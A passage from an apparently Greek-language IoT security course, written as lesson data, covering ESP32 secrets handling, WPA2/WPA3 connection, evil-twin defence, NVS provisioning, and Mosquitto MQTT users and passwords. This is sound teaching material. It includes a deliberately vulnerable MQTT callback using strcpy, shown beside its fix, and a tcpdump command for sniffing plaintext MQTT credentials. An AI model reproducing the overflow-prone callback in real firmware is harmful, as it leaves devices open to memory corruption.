            '- Ένα απλό module με σταθερές. Στο `main.py` γράφεις `import secrets`.',
            '- Το ανεβάζεις στη συσκευή με `mpremote cp secrets.py :secrets.py`.',
            '- Θυμήσου: στο filesystem του ESP32 είναι **απλό κείμενο**. Προστατεύει το repo, όχι τη συσκευή (αυτό το λύνει το flash encryption, Εν. 5).'
          )),
          text(
            '### Ασφαλής κώδικας: τα δεδομένα από το δίκτυο είναι εχθρικά',
            'Ό,τι έρχεται από MQTT, HTTP ή Serial μπορεί να το έχει στείλει επιτιθέμενος. Ένα κλασικό bug με την PubSubClient: το `payload` **δεν τελειώνει σε `\\0`**.'
          ),
          code('cpp', '❌ vs ✅ callback του MQTT', R`
const int RELAY_PIN = 26;

// ❌ ΛΑΘΟΣ: διαβάζει πέρα από το buffer, strcpy χωρίς όριο
void onMessageBad(char* topic, byte* payload, unsigned int length) {
  char cmd[8];
  strcpy(cmd, (char*)payload);      // ❌ buffer overflow αν length >= 8
  if (strcmp(cmd, "ON") == 0) digitalWrite(RELAY_PIN, HIGH);
}

// ✅ ΣΩΣΤΟ: έλεγχος μήκους, null-termination, whitelist εντολών
void onMessage(char* topic, byte* payload, unsigned int length) {
  char cmd[8];
  if (length == 0 || length >= sizeof(cmd)) {   // απόρριψη άδειων/τεράστιων
    Serial.println("[MQTT] απορρίφθηκε: λάθος μήκος");
    return;
  }
  memcpy(cmd, payload, length);
  cmd[length] = '\0';                            // τώρα είναι σωστό C string

  if (strcmp(cmd, "ON") == 0)       digitalWrite(RELAY_PIN, HIGH);
  else if (strcmp(cmd, "OFF") == 0) digitalWrite(RELAY_PIN, LOW);
  else Serial.println("[MQTT] άγνωστη εντολή, αγνοήθηκε");
}
`, L(
            '- Το `payload` είναι απλά bytes με μήκος `length`. Δεν υπάρχει `\\0` στο τέλος.',
            '- `strcpy` αντιγράφει μέχρι να βρει `\\0`, όσο μακριά κι αν είναι → γράφει πάνω σε άλλες μεταβλητές της στοίβας (**stack overflow**). Σε χειρότερη περίπτωση: εκτέλεση κώδικα.',
            '- `length >= sizeof(cmd)`: κρατάμε μία θέση για το `\\0`.',
            '- **Whitelist:** δεχόμαστε μόνο γνωστές εντολές (`ON`, `OFF`). Οτιδήποτε άλλο αγνοείται.'
          )),
          tip('Χρησιμοποιείς ArduinoJson; Έλεγχε πάντα το αποτέλεσμα του `deserializeJson()` και τα όρια κάθε αριθμού (π.χ. interval από 10 έως 3600). Ποτέ μην εμπιστεύεσαι ότι «το πεδίο θα υπάρχει».'),
          quiz('Γιατί δεν αρκεί να σβήσεις το `secrets.h` με νέο commit, αν είχε ανέβει ήδη σε δημόσιο repo;',
            ['Γιατί το Git δεν σβήνει αρχεία', 'Γιατί ο κωδικός υπάρχει στο ιστορικό, σε forks και ίσως σε bots που τον βρήκαν: πρέπει να αλλάξεις τον κωδικό', 'Γιατί το GitHub κρατάει backup 1 έτους', 'Αρκεί, δεν υπάρχει πρόβλημα'], 1,
            'Ένα μυστικό που δημοσιεύτηκε έστω και για λίγο θεωρείται **compromised**. Η μόνη πραγματική λύση είναι η αλλαγή του (rotation).'),
          quiz('Στο callback της PubSubClient, γιατί το `strcpy(cmd, (char*)payload)` είναι επικίνδυνο;',
            ['Είναι αργό', 'Το payload δεν τελειώνει σε `\\0` και μπορεί να είναι μεγαλύτερο από το buffer → buffer overflow', 'Το strcpy δεν υπάρχει στο ESP32', 'Αλλάζει το topic'], 1,
            'Χρησιμοποίησε πάντα το `length`: έλεγξε το όριο, κάνε `memcpy` και βάλε μόνος σου `\\0`.'),
        ],
      },
      {
        id: 'iot-3-2', title: 'Ασφαλής σύνδεση Wi‑Fi: WPA2/WPA3, events, evil twin', minutes: 16,
        goal: 'Να συνδέεις το ESP32 μόνο σε δίκτυα **WPA2/WPA3**, να χειρίζεσαι αποσυνδέσεις σωστά (Arduino & MicroPython) και να καταλάβεις πώς σε προστατεύει από evil twin.',
        blocks: [
          text(
            '### Ποια κρυπτογράφηση Wi‑Fi;',
            'Το ESP32 υποστηρίζει όλες τις μορφές, από **open** μέχρι **WPA3-SAE**. Εσύ πρέπει να του πεις να **αρνείται** τις αδύναμες.'
          ),
          table(['Mode', 'Ασφάλεια', 'Σχόλιο'], [
            ['Open', '❌ καμία', 'Όλοι βλέπουν όλα. Ποτέ για IoT.'],
            ['WEP', '❌ σπάει σε λεπτά', 'Απαρχαιωμένο.'],
            ['WPA (TKIP)', '❌ αδύναμο', 'Απαρχαιωμένο.'],
            ['WPA2-PSK (AES/CCMP)', '✅ καλό', 'Αρκεί με **μακρύ τυχαίο** κωδικό (16+ χαρακτήρες). Με αδύναμο κωδικό σπάει offline από το handshake.'],
            ['WPA3-SAE', '✅✅ καλύτερο', 'Αντέχει σε offline brute force, PMF υποχρεωτικό. Το ESP32 το υποστηρίζει ως station.'],
            ['WPA2/WPA3 transition', '✅ πρακτικό', 'Οι παλιές συσκευές μπαίνουν με WPA2, οι νέες με WPA3.'],
          ]),
          code('cpp', 'wifi_secure.ino: σύνδεση με ελάχιστο WPA2, events και timeout', R`
#include <WiFi.h>
#include "secrets.h"

static void onWiFiEvent(WiFiEvent_t event, WiFiEventInfo_t info) {
  switch (event) {
    case ARDUINO_EVENT_WIFI_STA_GOT_IP:
      Serial.printf("[WiFi] IP=%s RSSI=%d dBm\n",
                    WiFi.localIP().toString().c_str(), WiFi.RSSI());
      break;
    case ARDUINO_EVENT_WIFI_STA_DISCONNECTED:
      // Ο κωδικός reason βοηθά στη διάγνωση (π.χ. 15 = 4-way handshake timeout = λάθος κωδικός)
      Serial.printf("[WiFi] αποσύνδεση, reason=%d\n", info.wifi_sta_disconnected.reason);
      break;
    default:
      break;
  }
}

bool connectWiFi(uint32_t timeoutMs = 20000) {
  WiFi.persistent(false);                   // μην αποθηκεύεις credentials στο NVS του driver
  WiFi.setHostname("sensor01");             // πριν το mode/begin
  WiFi.mode(WIFI_STA);                      // μόνο station, όχι και AP
  WiFi.setMinSecurity(WIFI_AUTH_WPA2_PSK);  // αρνείται open/WEP/WPA
  WiFi.setAutoReconnect(true);
  WiFi.onEvent(onWiFiEvent);
  WiFi.begin(WIFI_SSID, WIFI_PASS);

  uint32_t t0 = millis();
  while (WiFi.status() != WL_CONNECTED) {
    if (millis() - t0 > timeoutMs) return false;
    delay(250);
  }
  return true;
}

void setup() {
  Serial.begin(115200);
  if (!connectWiFi()) {
    Serial.println("[WiFi] αποτυχία, επανεκκίνηση σε 10s");
    delay(10000);
    ESP.restart();
  }
}

void loop() {
  // Η εφαρμογή σου εδώ. Το autoReconnect φροντίζει τις σύντομες διακοπές.
  delay(1000);
}
`, L(
            '- `WiFi.persistent(false)`: από προεπιλογή ο Wi‑Fi driver γράφει SSID/κωδικό στο NVS του. Δεν το χρειαζόμαστε, αφού τα έχουμε ήδη.',
            '- `setHostname`: φιλικό όνομα στη λίστα DHCP του router (και στο NetWatch). Πρέπει να μπει **πριν** το `mode`/`begin`.',
            '- `WIFI_STA`: χωρίς να ανοίξει κατά λάθος και δικό του access point.',
            '- `setMinSecurity(WIFI_AUTH_WPA2_PSK)`: αν κάποιος στήσει **open** δίκτυο με το ίδιο SSID, το ESP32 **αρνείται** να συνδεθεί. Για αυστηρό WPA3: `WIFI_AUTH_WPA3_PSK`.',
            '- `onEvent`: μαθαίνεις πότε και **γιατί** έγινε αποσύνδεση. Πολλές αποσυνδέσεις στη σειρά = πιθανό deauth attack ή κακό σήμα.',
            '- Timeout + `ESP.restart()`: η συσκευή δεν «κολλάει» για πάντα σε άπειρο loop.'
          )),
          tip('Το ESP-IDF 5 (άρα και το Arduino core 3.x) έχει πάντα ενεργό **PMF capable** (802.11w). Ρύθμισε τον router σου σε PMF **optional** ή **required** και τα deauth πακέτα του επιτιθέμενου απορρίπτονται.'),
          text('### Το ίδιο σε MicroPython, με έλεγχο ασφάλειας του δικτύου πριν τη σύνδεση'),
          code('micropython', 'wifi.py', R`
import network
import time
import machine
import secrets

# Τιμές authmode από το wlan.scan() στο ESP32 (wifi_auth_mode_t του ESP-IDF)
AUTH_NAMES = {0: "OPEN", 1: "WEP", 2: "WPA-PSK", 3: "WPA2-PSK",
              4: "WPA/WPA2-PSK", 5: "WPA2-ENT", 6: "WPA3-PSK", 7: "WPA2/WPA3-PSK"}
MIN_OK = (3, 6, 7)   # δεχόμαστε μόνο WPA2, WPA3 ή WPA2/WPA3


def connect(timeout_s=20):
    network.hostname("sensor02")
    wlan = network.WLAN(network.STA_IF)
    wlan.active(True)
    if wlan.isconnected():
        return wlan

    # Βρες το δίκτυό μας στο scan και έλεγξε την κρυπτογράφηση
    found = [n for n in wlan.scan() if n[0].decode() == secrets.WIFI_SSID]
    if not found:
        raise OSError("Το SSID δεν βρέθηκε")
    best = max(found, key=lambda n: n[3])          # το πιο δυνατό σήμα
    auth = best[4]
    print("Βρέθηκε:", secrets.WIFI_SSID, "RSSI", best[3], "auth", AUTH_NAMES.get(auth, auth))
    if auth not in MIN_OK:
        raise OSError("Αδύναμη κρυπτογράφηση, ΔΕΝ συνδέομαι")
    if len(found) > 1:
        print("⚠️ Το ίδιο SSID από", len(found), "APs (mesh ή evil twin;)")

    wlan.connect(secrets.WIFI_SSID, secrets.WIFI_PASS)
    t0 = time.ticks_ms()
    while not wlan.isconnected():
        if time.ticks_diff(time.ticks_ms(), t0) > timeout_s * 1000:
            raise OSError("Timeout σύνδεσης")
        time.sleep_ms(250)
    print("IP:", wlan.ifconfig()[0])
    return wlan


try:
    wlan = connect()
except OSError as e:
    print("Wi-Fi σφάλμα:", e)
    time.sleep(10)
    machine.reset()
`, L(
            '- `network.hostname()`: ορίζει το όνομα της συσκευής (MicroPython 1.20+).',
            '- `wlan.scan()` επιστρέφει tuples: `(ssid, bssid, channel, RSSI, authmode, hidden)`.',
            '- Ελέγχουμε το `authmode` **πριν** στείλουμε τον κωδικό. Αν κάποιος στήσει open δίκτυο με το ίδιο όνομα, δεν συνδεόμαστε.',
            '- Αν βλέπουμε το ίδιο SSID από πολλά BSSID: σε mesh είναι φυσιολογικό· αλλιώς αξίζει προσοχή.',
            '- `time.ticks_diff()`: σωστός τρόπος σύγκρισης χρόνων στο MicroPython (χειρίζεται το overflow).',
            '- Σε κάθε σφάλμα: περιμένουμε και κάνουμε `machine.reset()`, αντί να κολλήσουμε.'
          )),
          anim('iot-evil-twin', 'Πάτα ▶: δυνατό PSK σταματά τον ψεύτικο AP. Κι αν ο κωδικός διαρρεύσει, το TLS με τη δική σου CA είναι το δεύτερο τείχος.'),
          text(
            '### Άμυνα σε βάθος',
            'Το evil twin δείχνει γιατί δεν αρκεί ένα μέτρο:',
            '1. **Δυνατός, μοναδικός PSK** (ή WPA3): ο ψεύτικος AP δεν μπορεί να κάνει handshake.',
            '1. **Κωδικός που δεν διαρρέει** (secrets εκτός Git, flash encryption).',
            '1. **TLS με έλεγχο πιστοποιητικού** (Εν. 4): ακόμα κι αν το Wi‑Fi πέσει, τα δεδομένα δεν διαβάζονται και δεν αλλοιώνονται.',
            '1. Προαιρετικά: **BSSID pinning** με `WiFi.begin(ssid, pass, 0, bssid)`, αν έχεις ένα μόνο AP (σπάει σε mesh/αλλαγή router).'
          ),
          nw('wifi', 'Το **Wi‑Fi Guard** του NetWatch ελέγχει το δίκτυο όπου είσαι για κρυπτογράφηση, **evil twin** και ARP spoofing. Δοκίμασέ το στο δίκτυο του σπιτιού σου.'),
          quiz('Τι κάνει το `WiFi.setMinSecurity(WIFI_AUTH_WPA2_PSK)`;',
            ['Αλλάζει τον κωδικό σε WPA2', 'Το ESP32 αρνείται να συνδεθεί σε δίκτυα πιο αδύναμα από WPA2-PSK (open, WEP, WPA)', 'Ενεργοποιεί WPA3', 'Κρυπτογραφεί το flash'], 1,
            'Αν ένας επιτιθέμενος στήσει **open** δίκτυο με το ίδιο όνομα, η συσκευή απλά δεν συνδέεται.'),
          quiz('Ο επιτιθέμενος έστησε evil twin και **ξέρει** τον κωδικό Wi‑Fi. Τι προστατεύει ακόμα τα δεδομένα MQTT;',
            ['Το SSID', 'Το TLS με έλεγχο του πιστοποιητικού του broker μέσω της δικής σου CA', 'Το RSSI', 'Τίποτα'], 1,
            'Το TLS κρυπτογραφεί τα δεδομένα και, με τον έλεγχο της CA, εμποδίζει τον επιτιθέμενο να παραστήσει τον broker.'),
        ],
      },
      {
        id: 'iot-3-3', title: 'Provisioning: ρύθμιση χωρίς κωδικούς στο firmware', minutes: 15,
        goal: 'Να αποθηκεύεις τα credentials στο **NVS** με `Preferences` αντί για το firmware, να τα περνάς με ασφαλή τρόπο (provisioning) και να ξέρεις τους κινδύνους του κάθε τρόπου.',
        blocks: [
          text(
            'Με το `secrets.h` ο κωδικός δεν είναι στο Git, αλλά **είναι** μέσα στο binary. Αν φτιάξεις 10 αισθητήρες, πρέπει να κάνεις compile 10 φορές με διαφορετικό `secrets.h`. Και κάθε `.bin` περιέχει κωδικούς.',
            '',
            '**Provisioning** είναι η διαδικασία με την οποία μια συσκευή παίρνει τα στοιχεία της (Wi‑Fi, MQTT user) **μετά** το flashing. Το firmware μένει ίδιο για όλες, και κάθε συσκευή έχει δικά της μυστικά στο **NVS** (non-volatile storage, ένα partition του flash).'
          ),
          table(['Τρόπος', 'Πώς', 'Ασφάλεια'], [
            ['Serial (USB)', 'Γράφεις τα στοιχεία από τον υπολογιστή με καλώδιο', '✅ Χρειάζεται φυσική πρόσβαση. Απλό.'],
            ['Captive portal (WiFiManager)', 'Η συσκευή ανοίγει δικό της AP με σελίδα ρυθμίσεων', '⚠️ Βάλε **κωδικό στο AP** και timeout· αλλιώς όποιος είναι κοντά τη ρυθμίζει.'],
            ['BLE / SoftAP με ESP-IDF provisioning', 'Εφαρμογή ESP BLE Prov, **Security 1/2** με proof-of-possession', '✅✅ Κρυπτογραφημένο κανάλι + κωδικός ανά συσκευή.'],
            ['Hardcoded', 'Στο firmware', '❌ Όλες οι συσκευές ίδιοι κωδικοί.'],
          ]),
          code('cpp', 'provisioning.ino: Serial provisioning + Preferences (NVS)', R`
#include <WiFi.h>
#include <Preferences.h>

Preferences prefs;
const int PROV_BUTTON = 0;     // το κουμπί BOOT στις περισσότερες πλακέτες

String readLine(uint32_t timeoutMs) {
  Serial.setTimeout(timeoutMs);
  String s = Serial.readStringUntil('\n');
  s.trim();                    // αφαιρεί \r και κενά
  return s;
}

void provisionOverSerial() {
  Serial.println("\n== PROVISIONING (60s ανά πεδίο) ==");
  Serial.print("SSID: ");
  String ssid = readLine(60000);
  Serial.print("\nWi-Fi password: ");
  String pass = readLine(60000);
  Serial.print("\nMQTT password: ");
  String mqttPass = readLine(60000);

  // Έλεγχος εισόδου: όρια του 802.11 και ελάχιστο μήκος
  if (ssid.length() < 1 || ssid.length() > 32 ||
      pass.length() < 8 || pass.length() > 63 || mqttPass.length() < 12) {
    Serial.println("\n❌ Μη έγκυρα στοιχεία, δεν αποθηκεύτηκε τίποτα.");
    return;
  }
  prefs.begin("creds", false);           // false = read/write
  prefs.putString("ssid", ssid);
  prefs.putString("pass", pass);
  prefs.putString("mqtt", mqttPass);
  prefs.end();
  Serial.println("\n✅ Αποθηκεύτηκαν στο NVS. Επανεκκίνηση...");
  delay(500);
  ESP.restart();
}

void setup() {
  Serial.begin(115200);
  pinMode(PROV_BUTTON, INPUT_PULLUP);
  Serial.println("Πάτα το BOOT μέσα σε 3s για provisioning...");
  uint32_t t0 = millis();
  while (millis() - t0 < 3000) {
    if (digitalRead(PROV_BUTTON) == LOW) { provisionOverSerial(); break; }
    delay(20);
  }

  prefs.begin("creds", true);            // true = μόνο ανάγνωση
  String ssid = prefs.getString("ssid", "");
  String pass = prefs.getString("pass", "");
  prefs.end();

  if (ssid.isEmpty()) {
    Serial.println("Δεν υπάρχουν στοιχεία. Κάνε reset και πάτα BOOT.");
    return;
  }
  WiFi.persistent(false);
  WiFi.mode(WIFI_STA);
  WiFi.setMinSecurity(WIFI_AUTH_WPA2_PSK);
  WiFi.begin(ssid.c_str(), pass.c_str());
  Serial.printf("Σύνδεση στο %s...\n", ssid.c_str());
}

void loop() {}
`, L(
            '- `Preferences`: απλό key-value store πάνω στο NVS. Τα δεδομένα μένουν μετά από reboot και **μετά από νέο flashing** του app (αν δεν σβήσεις όλο το flash).',
            '- **Γιατί «μέσα σε 3s» και όχι «κράτα το BOOT στο reset»;** Αν το GPIO0 είναι LOW τη στιγμή του reset, το ESP32 μπαίνει σε **download mode** του ROM και δεν τρέχει καθόλου το πρόγραμμά σου.',
            '- `readStringUntil(\'\\n\')` με timeout: δεν κολλάει για πάντα αν δεν γράψεις τίποτα.',
            '- Έλεγχος μήκους: το SSID είναι 1–32 bytes, το WPA2 passphrase 8–63 χαρακτήρες. Ό,τι είναι εκτός ορίων απορρίπτεται.',
            '- `prefs.begin("creds", true)`: ανοίγουμε **read-only** όταν απλώς διαβάζουμε.',
            '- Οι κωδικοί **δεν** τυπώνονται ποτέ στο Serial.'
          )),
          warn(
            'Το NVS **δεν** είναι κρυπτογραφημένο από προεπιλογή. Όποιος έχει τη συσκευή και ένα USB καλώδιο τρέχει `esptool read_flash` και βλέπει τους κωδικούς (Εν. 6). Η λύση είναι **Flash Encryption + NVS Encryption** (Εν. 5). Μέχρι τότε: ξεχωριστό IoT Wi‑Fi (Εν. 7) και μοναδικός MQTT κωδικός ανά συσκευή, για να μη χάσεις «όλο το σπίτι» αν κλαπεί ένας αισθητήρας.'
          ),
          code('micropython', 'provision.py: το ίδιο σε MicroPython (αρχείο JSON)', R`
import json
import machine
import time

CFG = "wifi.json"
btn = machine.Pin(0, machine.Pin.IN, machine.Pin.PULL_UP)


def load():
    try:
        with open(CFG) as f:
            return json.load(f)
    except (OSError, ValueError):
        return None


def provision():
    ssid = input("SSID: ").strip()
    pw = input("Wi-Fi password: ").strip()
    if not (1 <= len(ssid) <= 32 and 8 <= len(pw) <= 63):
        print("Μη έγκυρα στοιχεία")
        return
    with open(CFG, "w") as f:
        json.dump({"ssid": ssid, "pass": pw}, f)
    print("Αποθηκεύτηκε. Reset...")
    time.sleep(1)
    machine.reset()


print("Πάτα BOOT μέσα σε 3s για provisioning")
t0 = time.ticks_ms()
while time.ticks_diff(time.ticks_ms(), t0) < 3000:
    if btn.value() == 0:
        provision()
        break
    time.sleep_ms(20)

cfg = load()
if cfg is None:
    print("Δεν υπάρχει ρύθμιση")
else:
    print("Ρύθμιση για SSID:", cfg["ssid"])    # ποτέ τον κωδικό
`, L(
            '- `input()` στο MicroPython διαβάζει από το REPL (USB serial). Το τρέχεις με `mpremote run provision.py` ή μέσω Thonny.',
            '- `json.load` μέσα σε `try`: ένα χαλασμένο αρχείο δεν «ρίχνει» τη συσκευή.',
            '- Ο ίδιος έλεγχος ορίων όπως στο Arduino.',
            '- Και εδώ το αρχείο είναι **απλό κείμενο** στο flash.'
          )),
          tip('Για πολλές συσκευές, το πιο ασφαλές έτοιμο εργαλείο είναι το provisioning του ESP-IDF (`wifi_provisioning`, στις νεότερες εκδόσεις και ως `network_provisioning`) με **Security 2** (SRP6a + AES-GCM): κάθε συσκευή έχει δικό της proof-of-possession, τυπωμένο σε QR στο κουτί.'),
          quiz('Γιατί δεν βάζουμε τον χρήστη να κρατάει πατημένο το BOOT (GPIO0) **τη στιγμή** του reset για να μπει σε provisioning;',
            ['Γιατί καίγεται το κουμπί', 'Γιατί με GPIO0 LOW στο reset το ESP32 μπαίνει σε ROM download mode και δεν τρέχει το πρόγραμμά μας', 'Γιατί σβήνει το NVS', 'Γιατί απενεργοποιεί το Wi‑Fi'], 1,
            'Το GPIO0 είναι **strapping pin**: η κατάστασή του στο reset επιλέγει boot mode. Γι’ αυτό ελέγχουμε το κουμπί λίγο **μετά** την εκκίνηση.'),
          quiz('Σε captive portal (WiFiManager), ποιο είναι το σημαντικότερο μέτρο;',
            ['Να έχει ωραίο design', 'Κωδικός στο AP ρύθμισης και timeout, ώστε να μην τη ρυθμίσει όποιος περνάει', 'Να είναι στο κανάλι 1', 'Να έχει SSID «Setup»'], 1,
            'Χωρίς κωδικό, οποιοσδήποτε κοντά μπορεί να συνδεθεί στο AP της συσκευής και να της δώσει **το δικό του** Wi‑Fi, άρα όλη η κίνηση περνά από αυτόν.'),
        ],
      },
    ],
  });

  // ====================================================================
  // MODULE 4 — Ασφαλής επικοινωνία: MQTT, TLS, pinning
  // ====================================================================
  M.push({
    id: 'iot-4', order: 4, title: 'Ασφαλής επικοινωνία: MQTT και TLS',
    desc: 'Mosquitto στο Pi με χρήστες, ACL και TLS στο 8883 με δική σου CA. Clients σε Arduino, MicroPython και Python. HTTPS και certificate pinning.',
    lessons: [
      {
        id: 'iot-4-1', title: 'MQTT από το μηδέν: broker, topics, pub/sub', minutes: 15,
        goal: 'Να καταλάβεις πώς δουλεύει το **MQTT** (broker, topics, wildcards, QoS, retained), να στήσεις **Mosquitto** στο Pi και να στείλεις τα πρώτα μηνύματα, προς το παρόν μόνο τοπικά.',
        blocks: [
          text(
            'Το **MQTT** είναι το πιο διαδεδομένο πρωτόκολλο για IoT: ελαφρύ, απλό, και ιδανικό για συσκευές με λίγη μνήμη όπως το ESP32.',
            '',
            '- **Broker**: ο «ταχυδρόμος». Όλοι συνδέονται σε αυτόν (εδώ: Mosquitto στο Raspberry Pi).',
            '- **Publish**: «στέλνω αυτό το μήνυμα στο topic `home/esp1/temp`».',
            '- **Subscribe**: «θέλω ό,τι έρχεται στο `home/+/temp`».',
            '- **Topic**: ιεραρχικό όνομα με `/`. Wildcards: `+` = ένα επίπεδο, `#` = όλα τα από κάτω (μόνο στο τέλος).',
            '- **QoS**: 0 = μία φορά «στην τύχη», 1 = τουλάχιστον μία φορά (με ACK), 2 = ακριβώς μία φορά.',
            '- **Retained**: ο broker κρατάει το τελευταίο μήνυμα του topic και το δίνει αμέσως σε όποιον κάνει subscribe αργότερα.',
            '- **Last Will (LWT)**: μήνυμα που δημοσιεύει ο broker αν ο client χαθεί απότομα.'
          ),
          anim('iot-mqtt-pubsub', 'Οι συσκευές δεν ξέρουν η μία την άλλη· μόνο τον broker και τα topics.'),
          code('bash', 'Εγκατάσταση Mosquitto στο Raspberry Pi', R`
sudo apt update
sudo apt install -y mosquitto mosquitto-clients
mosquitto -h | head -1                 # έκδοση (Bookworm: 2.0.x)
sudo systemctl enable --now mosquitto
sudo ss -tlnp | grep mosquitto         # σε ποια διεύθυνση ακούει;
`, L(
            '- `mosquitto`: ο broker. `mosquitto-clients`: τα εργαλεία `mosquitto_pub` και `mosquitto_sub`.',
            '- Στο **Mosquitto 2.x**, αν **δεν** ορίσεις κανέναν `listener`, ακούει **μόνο** σε `127.0.0.1:1883` και επιτρέπει anonymous μόνο εκεί. Θα δεις `127.0.0.1:1883` στο `ss`.',
            '- Αυτό είναι ασφαλές default: κανείς από το δίκτυο δεν μπορεί ακόμα να συνδεθεί.'
          )),
          code('bash', 'Πρώτο test (δύο τερματικά στο Pi)', R`
# Τερματικό 1: άκου ΟΛΑ τα topics κάτω από home/
mosquitto_sub -h localhost -t 'home/#' -v

# Τερματικό 2: στείλε μια μέτρηση
mosquitto_pub -h localhost -t 'home/esp1/temp' -m '22.5'

# Retained: ο broker θα το θυμάται
mosquitto_pub -h localhost -t 'home/esp1/status' -m 'online' -r
`, L(
            '- `-t \'home/#\'`: subscribe σε όλα τα topics κάτω από `home/`. Τα μονά εισαγωγικά εμποδίζουν το shell να «πειράξει» το `#`.',
            '- `-v` (verbose): τυπώνει και το topic, όχι μόνο το μήνυμα.',
            '- `-r`: retained. Σταμάτα και ξαναξεκίνα το `mosquitto_sub`: το `online` εμφανίζεται αμέσως.'
          )),
          text('### Python subscriber στο Pi (paho-mqtt 2.x)'),
          code('bash', 'Virtual environment για τα Python εργαλεία της διαδρομής', R`
sudo apt install -y python3-venv
python3 -m venv ~/iot-venv
~/iot-venv/bin/pip install --upgrade pip
~/iot-venv/bin/pip install "paho-mqtt>=2.0"
`, L(
            '- Στο Bookworm το `pip install` εκτός venv μπλοκάρεται (PEP 668), για να μη χαλάσει τα πακέτα του συστήματος.',
            '- Το `python3-paho-mqtt` του apt είναι 1.6.x· εμείς θέλουμε το API της **2.x**.'
          )),
          code('python', 'sub_basic.py', R`
import paho.mqtt.client as mqtt

def on_connect(client, userdata, flags, reason_code, properties):
    print("Συνδέθηκε:", reason_code)
    client.subscribe("home/#", qos=1)          # subscribe ΜΕΣΑ στο on_connect

def on_message(client, userdata, msg):
    print(f"{msg.topic} → {msg.payload.decode(errors='replace')} (retained={msg.retain})")

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="pi-logger")
client.on_connect = on_connect
client.on_message = on_message
client.connect("localhost", 1883, keepalive=60)
client.loop_forever()
`, L(
            '- `CallbackAPIVersion.VERSION2`: υποχρεωτικό στο paho 2.x. Ορίζει τη μορφή των callbacks (με `reason_code` και `properties`).',
            '- Το `subscribe` μπαίνει στο `on_connect`, ώστε μετά από αποσύνδεση/επανασύνδεση να ξαναγίνει αυτόματα.',
            '- `decode(errors=\'replace\')`: αν έρθουν μη έγκυρα bytes (π.χ. από επιτιθέμενο), δεν σκάει το script.',
            '- `loop_forever()`: χειρίζεται δίκτυο, keepalive και επανασυνδέσεις.',
            '- Τρέξ’ το με `~/iot-venv/bin/python sub_basic.py`.'
          )),
          tip('Σχεδίασε τα topics με τη **συσκευή στο όνομα**: `home/<device>/state`, `home/<device>/cmd`. Έτσι θα γράψεις απλές ACL του τύπου «ο sensor01 γράφει μόνο κάτω από `home/sensor01/`».'),
          quiz('Ποιο topic ταιριάζει στη συνδρομή `home/+/temp`;',
            ['`home/temp`', '`home/esp1/temp`', '`home/esp1/room/temp`', '`office/esp1/temp`'], 1,
            'Το `+` ταιριάζει **ακριβώς ένα** επίπεδο. Για πολλά επίπεδα χρειάζεσαι `#`.'),
          quiz('Το Mosquitto 2.x μόλις εγκαταστάθηκε χωρίς δικό σου config. Μπορεί ένα ESP32 στο LAN να συνδεθεί;',
            ['Ναι, χωρίς κωδικό', 'Όχι, ο broker ακούει μόνο στο localhost μέχρι να ορίσεις listener', 'Ναι, αλλά μόνο με TLS', 'Μόνο με QoS 2'], 1,
            'Από την 2.0 το Mosquitto είναι «secure by default»: χωρίς ρητό `listener` ακούει μόνο τοπικά.'),
        ],
      },
      {
        id: 'iot-4-2', title: 'Χρήστες και ACL: ποιος γράφει πού', minutes: 16,
        goal: 'Να δεις με τα μάτια σου γιατί το plaintext MQTT είναι επικίνδυνο, και να ρυθμίσεις στο Mosquitto **allow_anonymous false**, **password_file** και **ACL** ανά συσκευή.',
        blocks: [
          anim('iot-mqtt-sniff', 'Χωρίς TLS ο κωδικός MQTT ταξιδεύει «ανοιχτός». Με TLS ο επιτιθέμενος βλέπει μόνο θόρυβο.'),
          text(
            'Δοκίμασέ το στο **δικό σου** δίκτυο: αν έχεις έστω και προσωρινά listener 1883 στο LAN, τρέξε στο Pi:'
          ),
          code('bash', 'Τι φαίνεται στο καλώδιο (μόνο στο ΔΙΚΟ σου δίκτυο)', R`
sudo apt install -y tcpdump
# -A: τύπωσε το payload ως ASCII. Θα δεις user/pass και μετρήσεις!
sudo tcpdump -i any -n -A 'tcp port 1883'

# Σύγκρινε αργότερα με TLS: μόνο ακατάληπτα bytes
sudo tcpdump -i any -n -X 'tcp port 8883' | head -40
`, L(
            '- `-i any`: όλες οι διεπαφές. `-n`: χωρίς DNS lookups.',
            '- Στο πακέτο **CONNECT** του MQTT θα δεις το client id, το username και τον κωδικό ως απλό κείμενο.',
            '- `-X`: hex + ASCII. Στο 8883 θα δεις TLS records (`17 03 03 …`) χωρίς νόημα.'
          )),
          text(
            '### Βήμα 1: χρήστες και κωδικοί',
            'Κάθε συσκευή και κάθε εφαρμογή παίρνει **δικό της** χρήστη. Ο `mosquitto_passwd` αποθηκεύει τους κωδικούς ως **hash** (PBKDF2-SHA512 στη 2.x), όχι σε απλό κείμενο.'
          ),
          code('bash', 'Δημιουργία password file', R`
# -c ΔΗΜΙΟΥΡΓΕΙ νέο αρχείο (σβήνει το παλιό!). Μόνο την πρώτη φορά.
sudo mosquitto_passwd -c /etc/mosquitto/passwd sensor01

# Οι επόμενοι χρήστες ΧΩΡΙΣ -c
sudo mosquitto_passwd /etc/mosquitto/passwd sensor02
sudo mosquitto_passwd /etc/mosquitto/passwd dashboard

# Διαγραφή χρήστη (π.χ. κλάπηκε συσκευή)
sudo mosquitto_passwd -D /etc/mosquitto/passwd sensor02

# Μόνο ο χρήστης mosquitto διαβάζει το αρχείο
sudo chown mosquitto:mosquitto /etc/mosquitto/passwd
sudo chmod 600 /etc/mosquitto/passwd
sudo cat /etc/mosquitto/passwd     # θα δεις sensor01:$7$101$....
`, L(
            '- `-c`: create. Αν το ξανατρέξεις με `-c`, **χάνονται** όλοι οι υπόλοιποι χρήστες.',
            '- Ο κωδικός ζητείται διαδραστικά, άρα δεν μένει στο `history` του shell. (Το `-b user pass` τον αφήνει στο history: απόφυγέ το.)',
            '- `-D`: διαγραφή χρήστη. Μετά: `sudo systemctl reload mosquitto`.',
            '- `$7$`: η μορφή hash PBKDF2-SHA512 του Mosquitto 2.x.',
            '- Οι νέες εκδόσεις 2.0.x προειδοποιούν αν το αρχείο είναι αναγνώσιμο από όλους.'
          )),
          text(
            '### Βήμα 2: ACL (Access Control List)',
            'Ο κωδικός λέει **ποιος** είσαι. Η ACL λέει **τι** επιτρέπεται να κάνεις. Χωρίς ACL, ο `sensor01` θα μπορούσε να στείλει `ON` στο ρελέ του γείτονα-αισθητήρα ή να διαβάζει όλα τα δεδομένα.'
          ),
          code('text', '/etc/mosquitto/acl', R`
# Γραμμές «topic» ΠΡΙΝ από κάθε «user» ισχύουν για anonymous (εμείς δεν έχουμε anonymous)

